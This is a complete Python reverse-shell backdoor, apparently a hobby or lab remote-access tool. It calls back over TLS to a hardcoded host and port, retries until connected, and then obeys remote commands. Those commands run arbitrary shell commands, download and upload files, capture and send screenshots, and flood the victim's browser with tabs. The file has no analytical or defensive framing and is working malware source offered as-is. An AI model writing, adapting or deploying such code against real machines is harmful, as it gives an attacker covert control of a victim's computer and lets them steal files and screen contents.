#!/usr/bin/env python

import socket
import subprocess
import ssl
import json
import os
import base64
import webbrowser
import pyautogui
import time


HOST = "10.0.2.7"
PORT = 6666


def connect():
    while True:
        try:
            wrappedConnection.connect((HOST, PORT))
            send_data("Ping")
            time.sleep(1)
            ping = receive_data()
            if ping == "Pong":
                break
        except ConnectionRefusedError:
            time.sleep(300)
            pass


def distraction():
    i = 0
    while i < 696969696969669:
        i += 1
    return "Distraction complete"


def change_working_directory(path):
    os.chdir(path)
    return "[+] Changing work directory to " + path


def screenshot():
    pic = pyautogui.screenshot()
    pic.save("screenshot.png")
    screenshot_data = read_file("screenshot.png").decode("utf-8", "ignore")
    return screenshot_data


def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read())


def write_file(path, filedata):
    with open(path, "wb") as file:
        file.write(base64.b64decode(filedata))
        return "[+] Upload successful"


def baka_mitai():
    webbrowser.open("https://www.youtube.com/watch?v=7lhJ0LZtv3w")
    return "[+] Baka mitai launched"


def baka(numberoftabs):
    i = 0
    while i < numberoftabs:
        webbrowser.open("https://www.youtube.com/watch?v=7lhJ0LZtv3w", new=1, autoraise=True)
        i += 1
    return "[+] BAKA OVERLOARD"


def open_website(link):
    webbrowser.open(link)
    return "{+] Website " + link + " opened."


def open_website_number(link, tabs):
    i = 0
    while i < tabs:
        webbrowser.open(link, new=1, autoraise=True)
        i += 1
    return "{+] Website " + link + " opened " + str(i) + " times."


def system_command(command):
    try:
        return subprocess.check_output(command, shell=True)
    except subprocess.CalledProcessError:
        pass


def receive_data():
    data = b""
    while True:
        part = wrappedConnection.recv(1024)
        data += part
        if len(part) < 1024:
            break
    data = data.decode("utf-8", "ignore")
    return json.loads(data)


def send_data(command_result):
    json_data = json.dumps(command_result)
    wrappedConnection.send(json_data.encode())


# funTimes = distraction()
reverseConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
wrappedConnection = ssl.wrap_socket(reverseConnection, ssl_version=ssl.PROTOCOL_TLSv1, server_side=False)
connect()

while True:
    command = receive_data()
    try:
        if command[0] == "quit":
            wrappedConnection.close()
            exit()
        elif command[0] == "cd" and len(command) > 1:
            command_result = change_working_directory(command[1])
        elif command[0] == "download":
            command_result = read_file(command[1]).decode("utf-8", "ignore")
        elif command[0] == "bakamitai":
            command_result = baka_mitai()
        elif command[0] == "screenshot":
            command_result = screenshot()
            os.remove("screenshot.png")
        elif command[0] == "BAKA":
            command_result = baka(int(command[1]))
        elif command[0] == "opensite":
            if len(command) == 2:
                command_result = open_website(command[1])
            elif len(command) == 1:
                command_result = "[+] Missing the website link!"
            elif len(command) > 2:
                command_result = open_website_number(command[1], int(command[2]))
        elif command[0] == "upload":
            if len(command) > 3:
                command_result = write_file(command[2], command[-1])
            else:
                command_result = write_file(command[1], command[-1])

        else:
            command_result = system_command(command).decode("utf-8", "ignore")
    except Exception:
        command_result = "[+] Error"

    send_data(command_result)

